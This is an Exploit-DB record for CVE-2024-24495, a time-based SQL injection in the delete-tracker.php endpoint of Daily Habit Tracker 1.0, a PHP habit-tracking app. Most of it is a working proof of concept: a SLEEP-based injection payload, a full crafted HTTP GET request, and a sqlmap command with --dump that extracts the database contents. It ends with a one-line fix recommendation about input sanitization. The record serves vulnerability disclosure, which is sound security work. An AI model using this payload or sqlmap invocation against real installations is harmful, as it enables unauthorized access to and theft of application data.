{"source": "https://www.exploit-db.com/exploits/51953", "vulnName": "Daily Habit Tracker 1.0 - SQL Injection", "vulnEDBID": "51953", "vulnCVE": "2024-24495", "author": "YEVHENII BUTENKO", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Daily Habit Tracker 1.0 - SQL Injection\n# Date: 2 Feb 2024\n# Exploit Author: Yevhenii Butenko\n# Vendor Homepage: https://www.sourcecodester.com\n# Software Link: https://www.sourcecodester.com/php/17118/daily-habit-tracker-using-php-and-mysql-source-code.html\n# Version: 1.0\n# Tested on: Debian\n# CVE : CVE-2024-24495\n\n### SQL Injection:\n\n> SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or \"injection\" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system.\n\n### Affected Components:\n\n> delete-tracker.php\n\n### Description:\n\n> The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests.\n\n## Proof of Concept:\n\n### Manual Exploitation\n\nThe payload `'\"\";SELECT SLEEP(5)#` can be employed to force the database to sleep for 5 seconds:\n\n```\nGET /habit-tracker/endpoint/delete-tracker.php?tracker=5'\"\"%3bSELECT+SLEEP(5)%23 HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\n```\n\n![5 seconds delay](https://github.com/0xQRx/VunerabilityResearch/blob/master/2024/img/sqli.png?raw=true)\n\n### SQLMap\n\nSave the following request to `delete_tracker.txt`:\n\n```\nGET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nDNT: 1\nConnection: close\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: none\nSec-Fetch-User: ?1\n```\n\nUse `sqlmap` with `-r` option to exploit the vulnerability:\n\n```\nsqlmap -r ./delete_tracker.txt --level 5 --risk 3 --batch --technique=T --dump\n```\n\n## Recommendations\n\nWhen using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters.\n            "}